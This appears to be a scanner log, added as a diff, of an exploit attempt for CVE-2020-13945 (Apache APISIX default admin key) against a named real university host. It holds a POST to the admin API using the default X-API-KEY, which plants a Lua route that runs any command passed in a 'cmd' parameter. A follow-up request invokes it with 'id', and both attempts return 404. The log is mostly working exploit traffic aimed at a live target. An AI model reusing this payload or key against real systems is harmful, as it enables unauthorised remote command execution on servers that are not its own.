@@ -1,0 +1,56 @@
+[CVE-2020-13945] Dumped HTTP request for https://edtech.le.unimelb.edu.au/apisix/admin/routes
+
+
+POST /apisix/admin/routes HTTP/1.1
+Host: edtech.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 406
+Content-Type: application/json
+X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
+Accept-Encoding: gzip
+
+{
+  "uri":"/30v0wAi7pB7LyuCZAPvt6PGGjFQ",
+  "script":"local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f =        assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
+  "upstream":{
+    "type":"roundrobin",
+    "nodes":{
+      "interact.sh:80":1
+    }
+  }
+}
+[CVE-2020-13945] Dumped HTTP response https://edtech.le.unimelb.edu.au/apisix/admin/routes
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 989
+Content-Type: text/html;charset=utf-8
+Date: Wed, 06 Aug 2025 15:17:32 GMT
+Server: Apache
+Set-Cookie: BIGipServer~app_047s-prod_prod~pool_047s-prod_prod=851842988.47873.0000; path=/; Httponly; Secure
+Strict-Transport-Security: max-age=63072000; preload
+
+<html><head><title>Apache Tomcat/6.0.53 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 404 - /apisix/admin/routes</h1><HR size="1" noshade="noshade"><p><b>type</b> Status report</p><p><b>message</b> <u>/apisix/admin/routes</u></p><p><b>description</b> <u>The requested resource is not available.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/6.0.53</h3></body></html>
+[CVE-2020-13945] Dumped HTTP request for https://edtech.le.unimelb.edu.au/30v0wAi7pB7LyuCZAPvt6PGGjFQ?cmd=id
+
+
+GET /30v0wAi7pB7LyuCZAPvt6PGGjFQ?cmd=id HTTP/1.1
+Host: edtech.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Cookie: BIGipServer~app_047s-prod_prod~pool_047s-prod_prod=851842988.47873.0000
+Accept-Encoding: gzip
+
+
+[CVE-2020-13945] Dumped HTTP response https://edtech.le.unimelb.edu.au/30v0wAi7pB7LyuCZAPvt6PGGjFQ?cmd=id
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 1005
+Content-Type: text/html;charset=utf-8
+Date: Wed, 06 Aug 2025 15:17:32 GMT
+Server: Apache
+Strict-Transport-Security: max-age=63072000; preload
+
+<html><head><title>Apache Tomcat/6.0.53 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 404 - /30v0wAi7pB7LyuCZAPvt6PGGjFQ</h1><HR size="1" noshade="noshade"><p><b>type</b> Status report</p><p><b>message</b> <u>/30v0wAi7pB7LyuCZAPvt6PGGjFQ</u></p><p><b>description</b> <u>The requested resource is not available.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/6.0.53</h3></body></html>
